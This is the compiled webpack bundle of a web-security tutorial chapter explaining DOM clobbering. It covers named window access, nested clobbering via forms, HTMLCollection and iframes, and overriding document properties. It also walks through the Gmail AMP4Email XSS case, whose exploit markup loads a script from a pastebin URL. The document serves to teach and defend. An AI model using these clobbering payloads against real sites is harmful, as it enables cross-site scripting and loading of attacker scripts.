"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[289],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>h});var a=n(7294);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function r(e,t){if(null==e)return{};var n,a,i=function(e,t){if(null==e)return{};var n,a,i={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var s=a.createContext({}),c=function(e){var t=a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):l(l({},t),e)),n},p=function(e){var t=c(e.components);return a.createElement(s.Provider,{value:t},e.children)},d="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},u=a.forwardRef((function(e,t){var n=e.components,i=e.mdxType,o=e.originalType,s=e.parentName,p=r(e,["components","mdxType","originalType","parentName"]),d=c(n),u=i,h=d["".concat(s,".").concat(u)]||d[u]||m[u]||o;return n?a.createElement(h,l(l({ref:t},p),{},{components:n})):a.createElement(h,l({ref:t},p))}));function h(e,t){var n=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var o=n.length,l=new Array(o);l[0]=u;var r={};for(var s in t)hasOwnProperty.call(t,s)&&(r[s]=t[s]);r.originalType=e,r[d]="string"==typeof e?e:i,l[1]=r;for(var c=2;c<o;c++)l[c]=n[c];return a.createElement.apply(null,l)}return a.createElement.apply(null,n)}u.displayName="MDXCreateElement"},4908:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>l,default:()=>m,frontMatter:()=>o,metadata:()=>r,toc:()=>c});var a=n(7462),i=(n(7294),n(3905));const o={sidebar_position:15},l="Can HTML affect JavaScript? Introduction to DOM clobbering",r={unversionedId:"ch3/dom-clobbering",id:"ch3/dom-clobbering",title:"Can HTML affect JavaScript? Introduction to DOM clobbering",description:"Did you know that HTML can also affect JavaScript, in addition to vulnerabilities like prototype pollution?",source:"@site/i18n/en/docusaurus-plugin-content-docs/current/ch3/15-dom-clobbering.md",sourceDirName:"ch3",slug:"/ch3/dom-clobbering",permalink:"/beyond-xss/en/ch3/dom-clobbering",draft:!1,tags:[],version:"current",sidebarPosition:15,frontMatter:{sidebar_position:15},sidebar:"tutorialSidebar",previous:{title:"Prototype Pollution: Exploiting the Prototype Chain",permalink:"/beyond-xss/en/ch3/prototype-pollution"},next:{title:"Template Injection in Frontend: CSTI",permalink:"/beyond-xss/en/ch3/csti"}},s={},c=[{value:"Quantum Entanglement of DOM and window",id:"quantum-entanglement-of-dom-and-window",level:2},{value:"Introduction to DOM Clobbering",id:"introduction-to-dom-clobbering",level:2},{value:"Nested DOM Clobbering",id:"nested-dom-clobbering",level:2},{value:"More Nested",id:"more-nested",level:2},{value:"Expanding Attack Surface through document",id:"expanding-attack-surface-through-document",level:2},{value:"Case Study: Gmail AMP4Email XSS",id:"case-study-gmail-amp4email-xss",level:2},{value:"Conclusion",id:"conclusion",level:2}],p={toc:c},d="wrapper";function m(e){let{components:t,...o}=e;return(0,i.kt)(d,(0,a.Z)({},p,o,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"can-html-affect-javascript-introduction-to-dom-clobbering"},"Can HTML affect JavaScript? Introduction to DOM clobbering"),(0,i.kt)("p",null,"Did you know that HTML can also affect JavaScript, in addition to vulnerabilities like prototype pollution?"),(0,i.kt)("p",null,"We all know that JavaScript can manipulate HTML using the DOM API. But how can HTML affect the execution of JavaScript? That's where it gets interesting."),(0,i.kt)("p",null,"Before we dive in, let's start with a fun little challenge."),(0,i.kt)("p",null,"Suppose you have the following code snippet with a button and a script:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<head>\n  <meta charset="utf-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1">\n</head>\n\n<body>\n  <button id="btn">click me</button>\n  <script>\n    // TODO: add click event listener to button\n  <\/script>\n</body>\n</html>\n')),(0,i.kt)("p",null,'Now, try to implement the functionality "display ',(0,i.kt)("inlineCode",{parentName:"p"},"alert(1)"),' when the button is clicked" using the "shortest possible code" inside the ',(0,i.kt)("inlineCode",{parentName:"p"},"<script>")," tag."),(0,i.kt)("p",null,"For example, the following code achieves the goal:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-js"},"document.getElementById('btn')\n  .addEventListener('click', () => {\n    alert(1)\n  })\n")),(0,i.kt)("p",null,"So, what would be your answer to make the code as short as possible?"),(0,i.kt)("p",null,"Before we continue, take a moment to think about the question. Once you have an answer in mind, let's proceed!"),(0,i.kt)("p",null,"Spoiler alert:\n.",(0,i.kt)("br",{parentName:"p"}),"\n",".",(0,i.kt)("br",{parentName:"p"}),"\n",".",(0,i.kt)("br",{parentName:"p"}),"\n",".",(0,i.kt)("br",{parentName:"p"}),"\n",".",(0,i.kt)("br",{parentName:"p"}),"\n",".",(0,i.kt)("br",{parentName:"p"}),"\n",".",(0,i.kt)("br",{parentName:"p"}),"\n",".",(0,i.kt)("br",{parentName:"p"}),"\n",".",(0,i.kt)("br",{parentName:"p"}),"\n",".",(0,i.kt)("br",{parentName:"p"}),"\n",".",(0,i.kt)("br",{parentName:"p"}),"\n",".",(0,i.kt)("br",{parentName:"p"}),"\n",".  "),(0,i.kt)("h2",{id:"quantum-entanglement-of-dom-and-window"},"Quantum Entanglement of DOM and window"),(0,i.kt)("p",null,"Did you know that elements within the DOM can affect the ",(0,i.kt)("inlineCode",{parentName:"p"},"window")," object?"),(0,i.kt)("p",null,"I stumbled upon this behavior a few years ago in a frontend community on Facebook. It turns out that when you define an element with an ",(0,i.kt)("inlineCode",{parentName:"p"},"id")," in HTML, you can directly access it in JavaScript:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<button id="btn">click me</button>\n<script>\n  console.log(window.btn) // <button id="btn">click me</button>\n<\/script>\n')),(0,i.kt)("p",null,"And due to scoping, you can even access it directly using just ",(0,i.kt)("inlineCode",{parentName:"p"},"btn"),", as the current scope will search upwards until it finds ",(0,i.kt)("inlineCode",{parentName:"p"},"window"),"."),(0,i.kt)("p",null,"So, the answer to the previous question is:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-js"},"btn.onclick=()=>alert(1)\n")),(0,i.kt)("p",null,"No need for ",(0,i.kt)("inlineCode",{parentName:"p"},"getElementById")," or ",(0,i.kt)("inlineCode",{parentName:"p"},"querySelector"),". Simply use a variable with the same name as the id to access it."),(0,i.kt)("p",null,"This behavior is explicitly defined in the specification under ",(0,i.kt)("a",{parentName:"p",href:"https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object"},"7.3.3 Named access on the Window object"),":"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(3195).Z,width:"1408",height:"298"})),(0,i.kt)("p",null,"Here are two key points:"),(0,i.kt)("ol",null,(0,i.kt)("li",{parentName:"ol"},"The value of the name content attribute for all ",(0,i.kt)("inlineCode",{parentName:"li"},"embed"),", ",(0,i.kt)("inlineCode",{parentName:"li"},"form"),", ",(0,i.kt)("inlineCode",{parentName:"li"},"img"),", and ",(0,i.kt)("inlineCode",{parentName:"li"},"object")," elements that have a non-empty name content attribute."),(0,i.kt)("li",{parentName:"ol"},"The value of the ",(0,i.kt)("inlineCode",{parentName:"li"},"id")," content attribute for all HTML elements that have a non-empty id content attribute.")),(0,i.kt)("p",null,"This means that besides using ",(0,i.kt)("inlineCode",{parentName:"p"},"id")," to access elements directly through ",(0,i.kt)("inlineCode",{parentName:"p"},"window"),", you can also use the ",(0,i.kt)("inlineCode",{parentName:"p"},"name")," attribute to access ",(0,i.kt)("inlineCode",{parentName:"p"},"<embed>"),", ",(0,i.kt)("inlineCode",{parentName:"p"},"<form>"),", ",(0,i.kt)("inlineCode",{parentName:"p"},"<img>"),", and ",(0,i.kt)("inlineCode",{parentName:"p"},"<object>")," elements:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<embed name="a"></embed>\n<form name="b"></form>\n<img name="c" />\n<object name="d"></object>\n')),(0,i.kt)("p",null,"Understanding this specification leads us to a conclusion:"),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"We can influence JavaScript through HTML elements.")),(0,i.kt)("p",null,'And this technique can be used for attacks, known as DOM clobbering. I first encountered the term "clobbering" in the context of this attack, and upon further research, I found that it means "overwriting" in the field of computer science. It refers to using the DOM to overwrite certain elements to achieve an attack.'),(0,i.kt)("h2",{id:"introduction-to-dom-clobbering"},"Introduction to DOM Clobbering"),(0,i.kt)("p",null,"Under what circumstances can we use DOM clobbering for attacks?"),(0,i.kt)("p",null,"Firstly, there must be an opportunity to display your custom HTML on the page; otherwise, it won't be possible."),(0,i.kt)("p",null,"So, a potential attack scenario might look like this:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},"<!DOCTYPE html>\n<html>\n<body>\n  <h1>Comments</h1>\n  <div>\n    You comment: hello\n  </div> \n  <script>\n    if (window.TEST_MODE) {\n      // load test script\n      var script = document.createElement('script')\n      script.src = window.TEST_SCRIPT_SRC\n      document.body.appendChild(script)\n    }\n  <\/script>\n</body>\n</html>\n")),(0,i.kt)("p",null,"Let's say there is a comment board where you can enter any content. However, the input undergoes sanitization on the server-side, removing anything that can execute JavaScript. Therefore, ",(0,i.kt)("inlineCode",{parentName:"p"},"<script><\/script>")," gets removed, and the ",(0,i.kt)("inlineCode",{parentName:"p"},"onerror")," attribute of ",(0,i.kt)("inlineCode",{parentName:"p"},"<img src=x onerror=alert(1)>")," is stripped off. Many XSS payloads won't pass through."),(0,i.kt)("p",null,"In short, you cannot execute JavaScript to achieve XSS because all such attempts are filtered out."),(0,i.kt)("p",null,"However, due to various factors, HTML tags are not filtered out, so you can display custom HTML. As long as JavaScript is not executed, you can insert any HTML tag and set any attribute."),(0,i.kt)("p",null,"So, you can do the following:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <h1>Comments</h1>\n  <div>\n    Your comment: <div id="TEST_MODE"></div>\n    <a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>\n  </div> \n  <script>\n    if (window.TEST_MODE) {\n      // load test script\n      var script = document.createElement(\'script\')\n      script.src = window.TEST_SCRIPT_SRC\n      document.body.appendChild(script)\n    }\n  <\/script>\n</body>\n</html>\n')),(0,i.kt)("p",null,'Based on the knowledge we obtained above, you can insert a tag with the id "TEST_MODE" ',(0,i.kt)("inlineCode",{parentName:"p"},'<div id="TEST_MODE"></div>'),". This way, the JavaScript ",(0,i.kt)("inlineCode",{parentName:"p"},"if (window.TEST_MODE)")," will pass, because ",(0,i.kt)("inlineCode",{parentName:"p"},"window.TEST_MODE")," will be this div element."),(0,i.kt)("p",null,"Next, we can use ",(0,i.kt)("inlineCode",{parentName:"p"},'<a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>')," to make ",(0,i.kt)("inlineCode",{parentName:"p"},"window.TEST_SCRIPT_SRC")," become the string we want after conversion."),(0,i.kt)("p",null,"In most cases, simply overriding a variable with an HTML element is not enough. For example, if you convert ",(0,i.kt)("inlineCode",{parentName:"p"},"window.TEST_MODE")," in the above code snippet to a string and print it:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-js"},"// <div id=\"TEST_MODE\" />\nconsole.log(window.TEST_MODE + '')\n")),(0,i.kt)("p",null,"The result will be: ",(0,i.kt)("inlineCode",{parentName:"p"},"[object HTMLDivElement]"),"."),(0,i.kt)("p",null,"Converting an HTML element to a string will result in this format, which is not usable in this case. However, fortunately, there are two elements in HTML that are treated differently when converted to a string, ",(0,i.kt)("inlineCode",{parentName:"p"},"<base>")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"<a>"),":"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(1012).Z,width:"799",height:"665"})),(0,i.kt)("p",null,"Source: ",(0,i.kt)("a",{parentName:"p",href:"https://html.spec.whatwg.org/#api-for-a-and-area-elements"},"4.6.3 API for a and area elements")),(0,i.kt)("p",null,"These two elements return the URL when ",(0,i.kt)("inlineCode",{parentName:"p"},"toString")," is called, and we can set the URL using the href attribute, allowing us to control the content after ",(0,i.kt)("inlineCode",{parentName:"p"},"toString"),"."),(0,i.kt)("p",null,"So, combining the above techniques, we have learned:"),(0,i.kt)("ol",null,(0,i.kt)("li",{parentName:"ol"},"Using HTML with the id attribute to affect JavaScript variables."),(0,i.kt)("li",{parentName:"ol"},"Using ",(0,i.kt)("inlineCode",{parentName:"li"},"<a>")," with href and id to make the element's ",(0,i.kt)("inlineCode",{parentName:"li"},"toString")," result the value we want.")),(0,i.kt)("p",null,"By using these two techniques in the appropriate context, we can potentially exploit DOM clobbering."),(0,i.kt)("p",null,"However, here's an important reminder: if the variable you want to attack already exists, it cannot be overridden using DOM. For example:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<head>\n  <script>\n    TEST_MODE = 1\n  <\/script>\n</head>\n<body>\n  <div id="TEST_MODE"></div> \n  <script>\n    console.log(window.TEST_MODE) // 1\n  <\/script>\n</body>\n</html>\n')),(0,i.kt)("h2",{id:"nested-dom-clobbering"},"Nested DOM Clobbering"),(0,i.kt)("p",null,"In the previous example, we used DOM to override ",(0,i.kt)("inlineCode",{parentName:"p"},"window.TEST_MODE")," and create unexpected behavior. But what if the target to override is an object? Is it possible?"),(0,i.kt)("p",null,"For example, ",(0,i.kt)("inlineCode",{parentName:"p"},"window.config.isTest"),", can we override it using DOM clobbering?"),(0,i.kt)("p",null,"There are several ways to override it. The first one is by utilizing the hierarchical relationship of HTML tags, specifically the form element:"),(0,i.kt)("p",null,"In the HTML ",(0,i.kt)("a",{parentName:"p",href:"https://www.w3.org/TR/html52/sec-forms.html"},"spec"),", there is a section that states:"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(7318).Z,width:"858",height:"275"})),(0,i.kt)("p",null,"We can use ",(0,i.kt)("inlineCode",{parentName:"p"},"form[name]")," or ",(0,i.kt)("inlineCode",{parentName:"p"},"form[id]")," to access its child elements, for example:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <form id="config">\n    <input name="isTest" />\n    <button id="isProd"></button>\n  </form>\n  <script>\n    console.log(config) // <form id="config">\n    console.log(config.isTest) // <input name="isTest" />\n    console.log(config.isProd) // <button id="isProd"></button>\n  <\/script>\n</body>\n</html>\n')),(0,i.kt)("p",null,"This way, we can create two levels of DOM clobbering. However, there is one thing to note: there is no ",(0,i.kt)("inlineCode",{parentName:"p"},"<a>")," available here, so the result of ",(0,i.kt)("inlineCode",{parentName:"p"},"toString")," will be in an unusable form."),(0,i.kt)("p",null,"The more likely opportunity to exploit is when the thing you want to override is accessed using the ",(0,i.kt)("inlineCode",{parentName:"p"},"value")," property, for example: ",(0,i.kt)("inlineCode",{parentName:"p"},"config.environment.value"),". In this case, you can use the ",(0,i.kt)("inlineCode",{parentName:"p"},"value")," attribute of ",(0,i.kt)("inlineCode",{parentName:"p"},"<input>")," to override it:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <form id="config">\n    <input name="enviroment" value="test" />\n  </form>\n  <script>\n    console.log(config.enviroment.value) // test\n  <\/script>\n</body>\n</html>\n')),(0,i.kt)("p",null,"In simple terms, only the built-in attributes can be overridden, others cannot."),(0,i.kt)("p",null,"In addition to using the hierarchical nature of HTML itself, another feature that can be utilized is ",(0,i.kt)("inlineCode",{parentName:"p"},"HTMLCollection"),"."),(0,i.kt)("p",null,'In the earlier section about "Named access on the Window object" in the spec, it is stated:'),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(5042).Z,width:"1457",height:"420"})),(0,i.kt)("p",null,"If there are multiple things to be returned, an ",(0,i.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," is returned."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <a id="config"></a>\n  <a id="config"></a>\n  <script>\n    console.log(config) // HTMLCollection(2)\n  <\/script>\n</body>\n</html>\n')),(0,i.kt)("p",null,"So, what can we do with ",(0,i.kt)("inlineCode",{parentName:"p"},"HTMLCollection"),"? In ",(0,i.kt)("a",{parentName:"p",href:"https://dom.spec.whatwg.org/#interface-htmlcollection"},"4.2.10.2. Interface HTMLCollection"),", it is mentioned that we can access elements inside the ",(0,i.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," using name or id."),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(8768).Z,width:"703",height:"256"})),(0,i.kt)("p",null,"Like this:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <a id="config"></a>\n  <a id="config" name="apiUrl" href="https://huli.tw"></a>\n  <script>\n    console.log(config.apiUrl + \'\')\n    // https://huli.tw\n  <\/script>\n</body>\n</html>\n')),(0,i.kt)("p",null,"You can generate an ",(0,i.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," using the same id, and then use the name to retrieve a specific element from the ",(0,i.kt)("inlineCode",{parentName:"p"},"HTMLCollection"),", achieving a two-level effect."),(0,i.kt)("p",null,"And if we combine ",(0,i.kt)("inlineCode",{parentName:"p"},"<form>")," with the ",(0,i.kt)("inlineCode",{parentName:"p"},"HTMLCollection"),", we can achieve three levels:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <form id="config"></form>\n  <form id="config" name="prod">\n    <input name="apiUrl" value="123" />\n  </form>\n  <script>\n    console.log(config.prod.apiUrl.value) //123\n  <\/script>\n</body>\n</html>\n')),(0,i.kt)("p",null,"By using the same id, we allow ",(0,i.kt)("inlineCode",{parentName:"p"},"config")," to access the HTMLCollection. Then, using ",(0,i.kt)("inlineCode",{parentName:"p"},"config.prod"),', we can retrieve the element with the name "prod" from the HTMLCollection, which is the form. Next, we use ',(0,i.kt)("inlineCode",{parentName:"p"},"form.apiUrl")," to access the input under the form, and finally use ",(0,i.kt)("inlineCode",{parentName:"p"},"value")," to retrieve its attribute."),(0,i.kt)("p",null,"So, if the desired attribute is an HTML attribute, we can have four levels; otherwise, we can only have three levels."),(0,i.kt)("p",null,"However, it's a bit different in Firefox. In Firefox, it doesn't return an ",(0,i.kt)("inlineCode",{parentName:"p"},"HTMLCollection"),". For example, with the same code:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <a id="config"></a>\n  <a id="config"></a>\n  <script>\n    console.log(config) // <a id="config"></a>\n  <\/script>\n</body>\n</html>\n')),(0,i.kt)("p",null,"In Firefox, it will only output the first ",(0,i.kt)("inlineCode",{parentName:"p"},"<a>")," element, not an ",(0,i.kt)("inlineCode",{parentName:"p"},"HTMLCollection"),". Therefore, in Firefox, we can only use ",(0,i.kt)("inlineCode",{parentName:"p"},"<form>")," as well as the ",(0,i.kt)("inlineCode",{parentName:"p"},"<iframe>")," mentioned later."),(0,i.kt)("h2",{id:"more-nested"},"More Nested"),(0,i.kt)("p",null,"The previous mention of three levels or conditionally four levels is already the limit. Is there a way to surpass this limitation?"),(0,i.kt)("p",null,"According to the technique described in ",(0,i.kt)("a",{parentName:"p",href:"https://portswigger.net/research/dom-clobbering-strikes-back"},"DOM Clobbering strikes back"),", we can achieve it using iframes!"),(0,i.kt)("p",null,"When you create an iframe and give it a name, you can access the ",(0,i.kt)("inlineCode",{parentName:"p"},"window")," inside the iframe using that name. It can be done like this:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <iframe name="config" srcdoc=\'\n    <a id="apiUrl"></a>\n  \'></iframe>\n  <script>\n    setTimeout(() => {\n      console.log(config.apiUrl) // <a id="apiUrl"></a>\n    }, 500)\n  <\/script>\n</body>\n</html>\n')),(0,i.kt)("p",null,"The reason for using ",(0,i.kt)("inlineCode",{parentName:"p"},"setTimeout")," here is that iframes are not loaded synchronously, so we need some time to correctly access the contents inside the iframe."),(0,i.kt)("p",null,"With the help of iframes, we can create even more levels:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <iframe name="moreLevel" srcdoc=\'\n    <form id="config"></form>\n    <form id="config" name="prod">\n      <input name="apiUrl" value="123" />\n    </form>\n  \'></iframe>\n  <script>\n    setTimeout(() => {\n      console.log(moreLevel.config.prod.apiUrl.value) //123\n    }, 500)\n  <\/script>\n</body>\n</html>\n')),(0,i.kt)("p",null,"If you need more levels, you can use this useful tool created by @splitline: ",(0,i.kt)("a",{parentName:"p",href:"https://splitline.github.io/DOM-Clobber3r/"},"DOM Clobber3r")),(0,i.kt)("h2",{id:"expanding-attack-surface-through-document"},"Expanding Attack Surface through document"),(0,i.kt)("p",null,"As mentioned earlier, the opportunity to utilize DOM clobbering is not high because the code must first use a global variable that is not declared. Situations like this are usually caught by ESLint during development, so how did it end up online?"),(0,i.kt)("p",null,"The power of DOM clobbering lies in the fact that, besides ",(0,i.kt)("inlineCode",{parentName:"p"},"window"),", there are a few elements combined with a name that can affect the ",(0,i.kt)("inlineCode",{parentName:"p"},"document"),"."),(0,i.kt)("p",null,"Let's take a direct example to understand:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n\n<html lang="en">\n<head>\n  <meta charset="utf-8">\n</head>\n<body>\n  <img name=cookie>\n  <form id=test>\n    <h1 name=lastElementChild>I am first child</h1>\n    <div>I am last child</div>\n  </form>\n  <embed name=getElementById></embed>\n  <script>\n    console.log(document.cookie) // <img name="cookie">\n    console.log(document.querySelector(\'#test\').lastElementChild) // <div>I am last child</div>\n    console.log(document.getElementById) // <embed name=getElementById></embed>\n  <\/script>\n</body>\n</html>\n')),(0,i.kt)("p",null,"Here, we have used an HTML element to affect the document. The original ",(0,i.kt)("inlineCode",{parentName:"p"},"document.cookie")," should display the cookie, but now it has become the element ",(0,i.kt)("inlineCode",{parentName:"p"},"<img name=cookie>"),". Additionally, ",(0,i.kt)("inlineCode",{parentName:"p"},"lastElementChild"),", which should return the last element, is overridden by the name under the form, resulting in the retrieval of the element with the same name."),(0,i.kt)("p",null,"Even ",(0,i.kt)("inlineCode",{parentName:"p"},"document.getElementById")," can be overridden by DOM, causing an error when calling ",(0,i.kt)("inlineCode",{parentName:"p"},"document.getElementById()"),", which can crash the entire page."),(0,i.kt)("p",null,"In CTF challenges, it is often used in conjunction with the previously mentioned prototype pollution for better results:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="utf-8">\n</head>\n<body>\n  <img name=cookie>\n  <script>\n    // Assumed we can pollute an attribute to a custom function\n    Object.prototype.toString = () => \'a=1\'\n    console.log(`cookie: ${document.cookie}`) // cookie: a=1\n  <\/script>\n</body>\n</html>\n')),(0,i.kt)("p",null,"Why is that?"),(0,i.kt)("p",null,"Now, ",(0,i.kt)("inlineCode",{parentName:"p"},"document.cookie")," is an HTML element. When using template syntax, if the content is not a string, the ",(0,i.kt)("inlineCode",{parentName:"p"},"toString")," method is automatically called. However, HTML elements do not implement ",(0,i.kt)("inlineCode",{parentName:"p"},"toString")," themselves. Therefore, according to the prototype chain, it eventually calls our polluted ",(0,i.kt)("inlineCode",{parentName:"p"},"Object.prototype.toString"),", returning the polluted result."),(0,i.kt)("p",null,"By chaining these vulnerabilities, we can manipulate the value of ",(0,i.kt)("inlineCode",{parentName:"p"},"document.cookie")," and thus affect the subsequent flow."),(0,i.kt)("p",null,"DOMPurify, which was mentioned earlier, actually handles this part specifically when sanitizing:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-js"},"// https://github.com/cure53/DOMPurify/blob/d5060b309b5942fc5698070fbce83a781d31b8e9/src/purify.js#L1102\nconst _isValidAttribute = function (lcTag, lcName, value) {\n  /* Make sure attribute cannot clobber */\n  if (\n    SANITIZE_DOM &&\n    (lcName === 'id' || lcName === 'name') &&\n    (value in document || value in formElement)\n  ) {\n    return false;\n  }\n  // ...\n}\n")),(0,i.kt)("p",null,"If the values of id or name already exist in ",(0,i.kt)("inlineCode",{parentName:"p"},"document")," or ",(0,i.kt)("inlineCode",{parentName:"p"},"formElement"),", it skips the prevention of DOM clobbering against the document and form."),(0,i.kt)("p",null,"As for the previously mentioned Sanitizer API, the ",(0,i.kt)("a",{parentName:"p",href:"https://wicg.github.io/sanitizer-api/#dom-clobbering"},"specification"),' explicitly states: "The Sanitizer API does not protect DOM clobbering attacks in its default state." It does not provide protection against DOM clobbering by default.'),(0,i.kt)("h2",{id:"case-study-gmail-amp4email-xss"},"Case Study: Gmail AMP4Email XSS"),(0,i.kt)("p",null,"In 2019, there was a vulnerability in Gmail that could be exploited through DOM clobbering. A comprehensive write-up can be found here: ",(0,i.kt)("a",{parentName:"p",href:"https://research.securitum.com/xss-in-amp4email-dom-clobbering"},"XSS in GMail\u2019s AMP4Email via DOM Clobbering"),". Below, I will briefly explain the process (content sourced from the aforementioned article)."),(0,i.kt)("p",null,"In Gmail, you can use some AMP features, and Google has a strict validator for this format, making it difficult to perform XSS attacks using conventional methods."),(0,i.kt)("p",null,"However, someone discovered that it was possible to set an id on an HTML element. They found that when they set ",(0,i.kt)("inlineCode",{parentName:"p"},'<a id="AMP_MODE">'),", an error occurred in the console, indicating a script loading error with a portion of the URL being ",(0,i.kt)("inlineCode",{parentName:"p"},"undefined"),". After studying the code carefully, they found a code snippet that looked like this:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-js"},'var script = window.document.createElement("script");\nscript.async = false;\n\nvar loc;\nif (AMP_MODE.test && window.testLocation) {\n    loc = window.testLocation\n} else {\n    loc = window.location;\n}\n\nif (AMP_MODE.localDev) {\n    loc = loc.protocol + "//" + loc.host + "/dist"\n} else {\n    loc = "https://cdn.ampproject.org";\n}\n\nvar singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";\nb.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";\n\ndocument.head.appendChild(b);\n')),(0,i.kt)("p",null,"If we can make both ",(0,i.kt)("inlineCode",{parentName:"p"},"AMP_MODE.test")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"AMP_MODE.localDev")," truthy, and set ",(0,i.kt)("inlineCode",{parentName:"p"},"window.testLocation"),", we can load any script we want!"),(0,i.kt)("p",null,"So, the exploit would look like this:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'// clobber AMP_MODE.test and AMP_MODE.localDev\n<a id="AMP_MODE" name="localDev"></a>\n<a id="AMP_MODE" name="test"></a>\n\n// set testLocation.protocol\n<a id="testLocation"></a>\n<a id="testLocation" name="protocol" \n   href="https://pastebin.com/raw/0tn8z0rG#"></a>\n')),(0,i.kt)("p",null,"Finally, by successfully loading any script, XSS can be achieved! (However, the author was only able to reach this step before being blocked by CSP, showing that CSP is still very useful)."),(0,i.kt)("p",null,"This is one of the most famous examples of DOM clobbering, and the researcher who discovered this vulnerability is Micha\u0142 Bentkowski, who has created many classic cases mentioned previously when discussing Mutation XSS and prototype pollution."),(0,i.kt)("h2",{id:"conclusion"},"Conclusion"),(0,i.kt)("p",null,"Although the use cases for DOM clobbering are limited, it is indeed an interesting attack method! Moreover, if you are not aware of this feature, you may never have thought that HTML could be used to affect the content of global variables."),(0,i.kt)("p",null,"If you are interested in this attack technique, you can refer to PortSwigger's ",(0,i.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/dom-based/dom-clobbering"},"article"),", which provides two labs for you to personally try out this attack method. Just reading about it is not enough; you need to actually attempt the attack to fully understand it."),(0,i.kt)("p",null,"References:"),(0,i.kt)("ol",null,(0,i.kt)("li",{parentName:"ol"},(0,i.kt)("a",{parentName:"li",href:"http://blog.zeddyu.info/2020/03/04/Dom-Clobbering/#HTML-Relationships"},"\u4f7f\u7528 Dom Clobbering \u6269\u5c55 XSS")),(0,i.kt)("li",{parentName:"ol"},(0,i.kt)("a",{parentName:"li",href:"https://portswigger.net/research/dom-clobbering-strikes-back"},"DOM Clobbering strikes 